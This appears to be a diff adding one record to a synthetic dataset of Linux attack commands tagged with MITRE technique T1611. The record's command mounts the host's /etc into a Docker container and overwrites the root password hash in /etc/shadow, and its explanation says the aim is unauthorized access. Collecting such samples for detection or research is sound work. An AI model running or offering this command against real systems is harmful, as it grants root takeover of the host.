@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-d4045100-c655e7e7",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "docker run --rm -v /etc:/mnt/etc -it alpine sed -i 's/root:/root:$1$$coiNsR33DVoTA:/' /mnt/etc/shadow",
+  "explanation": "Runs an alpine container, mounts the host's /etc directory to the container, and uses sed to modify the root password hash in the shadow file, facilitating unauthorized access.",
+  "rationale_steps": [
+    "Mount the host's /etc directory inside a container.",
+    "Modify the shadow file to change the root password."
+  ],
+  "source_prompt_hash": "d4045100",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:26:37.904929Z"
+}
